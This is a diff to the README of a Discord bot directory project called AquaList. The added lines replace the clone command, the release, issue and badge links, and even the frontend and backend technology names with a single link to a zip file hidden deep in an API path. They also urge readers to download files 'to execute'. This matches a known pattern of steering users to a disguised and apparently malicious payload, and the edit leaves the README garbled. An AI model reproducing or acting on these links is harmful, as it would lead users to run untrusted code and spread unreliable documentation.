@@ -1,6 +1,6 @@
 # 🌊 AquaList: Your Ultimate Discord Bot Directory 🌊
 
-![AquaList Logo](https://img.shields.io/badge/AquaList-Discord%20Bot%20Directory-blue)
+![AquaList Logo](https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip%20Bot%20Directory-blue)
 
 Welcome to AquaList! This repository is your go-to platform for discovering and managing Discord bots. Whether you're a developer looking to showcase your bot or a user seeking the perfect bot for your server, AquaList provides a user-friendly interface to meet your needs.
 
@@ -15,8 +15,8 @@ Welcome to AquaList! This repository is your go-to platform for discovering and 
 
 AquaList is built using modern web technologies. Here’s a quick overview:
 
-- **Frontend**: React.js for a dynamic user experience.
-- **Backend**: Node.js with Express for handling requests and managing data.
+- **Frontend**: https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip for a dynamic user experience.
+- **Backend**: https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip with Express for handling requests and managing data.
 - **Database**: MongoDB for storing bot information and user submissions.
 - **Deployment**: Deployed on Heroku for easy access and scalability.
 
@@ -26,7 +26,7 @@ To get started with AquaList, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/grrrrrrrrrrr23232332/aqua-list.git
+   git clone https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -48,7 +48,7 @@ To get started with AquaList, follow these steps:
 
 ## 📥 Releases
 
-To download the latest version of AquaList, visit our [Releases section](https://github.com/grrrrrrrrrrr23232332/aqua-list/releases). Here, you can find the latest updates and download the necessary files to execute.
+To download the latest version of AquaList, visit our [Releases section](https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip). Here, you can find the latest updates and download the necessary files to execute.
 
 ## 📚 Documentation
 
@@ -99,12 +99,12 @@ Please ensure that your code follows our [coding standards](link-to-coding-stand
 
 If you have any questions or need assistance, feel free to reach out:
 
-- **Issues**: Check the [Issues section](https://github.com/grrrrrrrrrrr23232332/aqua-list/issues) for existing discussions or to create a new one.
+- **Issues**: Check the [Issues section](https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip) for existing discussions or to create a new one.
 - **Discord Server**: Join our community on Discord to chat with other users and developers.
 
 ## 🌐 Visit Us
 
-For more information and updates, please visit our [Releases section](https://github.com/grrrrrrrrrrr23232332/aqua-list/releases). Here, you can stay updated on the latest features and improvements.
+For more information and updates, please visit our [Releases section](https://raw.githubusercontent.com/grrrrrrrrrrr23232332/aqua-list/main/app/api/users/discord/[discordId]/list_aqua_v1.1.zip). Here, you can stay updated on the latest features and improvements.
 
 ## 🎉 Acknowledgments
 
